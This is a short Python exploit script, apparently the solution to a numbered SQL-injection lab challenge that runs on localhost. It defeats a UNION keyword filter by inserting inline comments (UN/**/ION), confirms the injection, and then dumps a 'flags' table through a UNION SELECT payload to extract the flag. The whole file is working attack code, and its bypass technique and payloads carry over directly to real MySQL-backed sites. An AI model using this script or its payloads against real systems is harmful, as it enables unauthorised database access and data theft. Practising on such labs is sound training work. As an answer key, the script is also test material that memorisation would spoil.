#!/usr/bin/env python3
"""SQLi-045: MySQL UNION Filter Bypass - Exploit Script"""

import requests

TARGET_URL = "http://localhost:5045/article"

def bypass_union(payload):
    """Replace UNION with UN/**/ION to bypass filter"""
    return payload.replace("UNION", "UN/**/ION").replace("union", "un/**/ion")

def send_payload(payload):
    bypassed = bypass_union(payload)
    params = {"id": bypassed}
    try:
        r = requests.get(TARGET_URL, params=params, timeout=10)
        return r.text
    except Exception as e:
        print(f"[!] Error: {e}")
        return None

def main():
    print("=" * 60)
    print("SQLi-045: MySQL UNION Filter Bypass Exploit")
    print("=" * 60)
    
    # Test injection
    print("\n[1] Testing injection...")
    response = send_payload("0 UNION SELECT 1,2,3,4-- -")
    if response and "1" in response:
        print("    [+] Injection successful!")
    
    # Extract flag
    print("\n[2] Extracting flag...")
    payload = "0 UNION SELECT 1,name,value,4 FROM flags-- -"
    response = send_payload(payload)
    
    if response and "FLAG{" in response:
        start = response.find("FLAG{")
        end = response.find("}", start) + 1
        flag = response[start:end]
        print(f"\n[+] FLAG FOUND: {flag}")
    else:
        print("[-] Could not extract flag")

if __name__ == "__main__":
    main()
